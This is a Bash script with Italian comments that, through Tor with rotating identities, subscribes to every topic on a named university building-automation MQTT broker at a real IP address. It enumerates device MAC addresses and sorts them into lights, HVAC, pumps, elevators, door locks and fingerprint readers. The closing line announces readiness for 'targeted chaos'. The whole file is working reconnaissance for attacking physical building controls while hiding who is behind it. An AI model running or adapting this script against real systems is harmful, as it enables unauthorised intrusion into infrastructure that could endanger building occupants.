#!/bin/bash
# ğŸ”¥ UIowa Echelon MAC ENUM + AUTO-CLASSIFICAZIONE PULITA w/ TORSOCKS
# Output: SOLO MAC pulite + tipo â†’ 02xxxxxx â†’ LIGHT | HVAC | etc.

HOST="128.255.220.144"
PORT="1883"
SID="17qja3r"
BASE="glp/0/${SID}/fb/dev/lon/"

TOR_PORT="9050"

# ğŸŒ TORify ogni comando
torsocks_cmd() {
    echo -n "ğŸ”„ TOR... " 
    echo 'SIGNAL NEWNYM' | nc 127.0.0.1 9051 >/dev/null 2>&1
    sleep 0.3
    torsocks "$@"
}

echo "ğŸ” ENUM MAC + CLASSIFICAZIONE TORSOCKS (attendi 45s)..."
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"

# STEP 1: Cattura TUTTI i MAC da output enorme (TOR + timeout 25s)
timeout 25 torsocks_cmd mosquitto_sub -h "$HOST" -p "$PORT" -t '#' -v 2>/dev/null | \
grep -oP '02[0-9a-fA-F]{10}' | sort -u > raw_macs.txt

mapfile -t ALL_MACS < raw_macs.txt

echo "ğŸ“¡ ${#ALL_MACS[@]} MAC trovate"
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"

# STEP 2: CLASSIFICAZIONE per ogni MAC (TOR parallelo)
> classified_macs.txt

for mac in "${ALL_MACS[@]}"; do
    # Query rapida DeviceType TOR (1.2s timeout)
    dev_type=$(timeout 1.2 torsocks_cmd mosquitto_sub -h "$HOST" -p "$PORT" \
        -t "${BASE}${mac}/if/device/0/nv_DeviceType" -C 1 -v 2>/dev/null | \
        tail -1 | grep -oE "[A-Z]+$" || echo "GENERIC")
    
    # Classifica e stampa PULITO
    case "$dev_type" in
        *LIGHT*|*LAMP*|*LED*) 
            echo "$mac â†’ ğŸ’¡ LIGHT"
            echo "$mac â†’ LIGHT" >> classified_macs.txt 
            ;;
        *HVAC*|*AIR*|*FAN*|*VAV*) 
            echo "$mac â†’ ğŸŒ¡ï¸ HVAC" 
            echo "$mac â†’ HVAC" >> classified_macs.txt 
            ;;
        *HEAT*|*HEATER*) 
            echo "$mac â†’ ğŸ”¥ HEAT" 
            echo "$mac â†’ HEAT" >> classified_macs.txt 
            ;;
        *PUMP*|*WATER*) 
            echo "$mac â†’ ğŸ’§ PUMP" 
            echo "$mac â†’ PUMP" >> classified_macs.txt 
            ;;
        *ELEVATOR*|*LIFT*) 
            echo "$mac â†’ ğŸ›— ELEVATOR" 
            echo "$mac â†’ ELEVATOR" >> classified_macs.txt 
            ;;
        *DOOR*|*LOCK*) 
            echo "$mac â†’ ğŸ”’ DOOR" 
            echo "$mac â†’ DOOR" >> classified_macs.txt 
            ;;
        *FPR*|*FINGER*) 
            echo "$mac â†’ ğŸ‘† FPR" 
            echo "$mac â†’ FPR" >> classified_macs.txt 
            ;;
        *) 
            echo "$mac â†’ âš™ï¸ GENERIC" 
            echo "$mac â†’ GENERIC" >> classified_macs.txt 
            ;;
    esac
done

echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo "ğŸ“Š RIASSUNTO TOR:"
grep -c "â†’ LIGHT" classified_macs.txt 2>/dev/null && echo "ğŸ’¡ LIGHT: $(grep -c 'â†’ LIGHT' classified_macs.txt)"
grep -c "â†’ HVAC" classified_macs.txt 2>/dev/null && echo "ğŸŒ¡ï¸ HVAC: $(grep -c 'â†’ HVAC' classified_macs.txt)"
grep -c "â†’ PUMP" classified_macs.txt 2>/dev/null && echo "ğŸ’§ PUMP: $(grep -c 'â†’ PUMP' classified_macs.txt)"
grep -c "â†’ ELEVATOR" classified_macs.txt 2>/dev/null && echo "ğŸ›— ELEVATOR: $(grep -c 'â†’ ELEVATOR' classified_macs.txt)"
grep -c "â†’ DOOR" classified_macs.txt 2>/dev/null && echo "ğŸ”’ DOOR: $(grep -c 'â†’ DOOR' classified_macs.txt)"
echo "âš™ï¸ GENERIC: $(grep -c 'â†’ GENERIC' classified_macs.txt)"
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo "ğŸ’¾ Salvato: classified_macs.txt | raw_macs.txt"
echo "ğŸ¯ Pronto per caos TORSOCKS mirato!"
